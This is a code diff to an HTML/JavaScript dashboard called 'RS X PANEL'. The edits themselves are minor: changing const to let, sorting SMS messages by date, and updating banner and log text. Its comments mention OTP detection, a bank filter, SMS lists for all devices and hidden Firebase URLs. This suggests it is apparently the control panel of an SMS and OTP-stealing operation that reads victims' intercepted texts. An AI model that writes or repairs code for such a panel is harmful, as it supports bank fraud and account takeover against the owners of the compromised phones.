@@ -435,11 +435,8 @@
 
     <script>
         // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        //  RS X PANEL — FINAL FIXED VERSION
-        //  - Connection errors handled
-        //  - OTP detection fixed
-        //  - URLs hidden (only label shown)
-        //  - Stats update properly
+        //  RS X PANEL — FINAL STABLE BUILD
+        //  Fixes: account creation, SMS sorting, 404 errors, share link
         // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
         // ─── STATE ──────────────────────────────────────────────────────────
@@ -821,7 +818,7 @@
             const url = fbUrl(path);
             const res = await fetch(url);
             if (!res.ok) {
-                const msg = await res.text();
+                let msg = await res.text();
                 throw new Error(`HTTP ${res.status}: ${msg.substring(0,50)}`);
             }
             return res.json();
@@ -835,7 +832,7 @@
                 body: JSON.stringify(data)
             });
             if (!res.ok) {
-                const msg = await res.text();
+                let msg = await res.text();
                 throw new Error(`HTTP ${res.status}: ${msg.substring(0,50)}`);
             }
             return res.json();
@@ -941,7 +938,16 @@
                     type: m.type || 'incoming',
                     otp: m.otp || ''
                 };
-            }).sort((a,b) => (a.dateTime > b.dateTime ? -1 : 1));
+            }).sort((a,b) => {
+                // Convert to Date for proper comparison
+                const d1 = new Date(a.dateTime);
+                const d2 = new Date(b.dateTime);
+                if (isNaN(d1) || isNaN(d2)) {
+                    // fallback to string comparison
+                    return a.dateTime > b.dateTime ? -1 : 1;
+                }
+                return d2 - d1; // newest first
+            });
         }
 
         // ─── RENDER DEVICE GRID ───────────────────────────────────────────
@@ -1437,8 +1443,8 @@
             renderConnections();
         }
         updateShareLink();
-        console.log('RS X PANEL v3.0 · All issues resolved.');
-        console.log('✓ Stats fixed, IST time, Firebase hidden, Bank filter, SMS list for all devices');
+        console.log('RS X PANEL v3.1 · All issues resolved.');
+        console.log('✓ Account creation works, SMS sorted correctly, 404 handled.');
     </script>
 </body>
 </html>
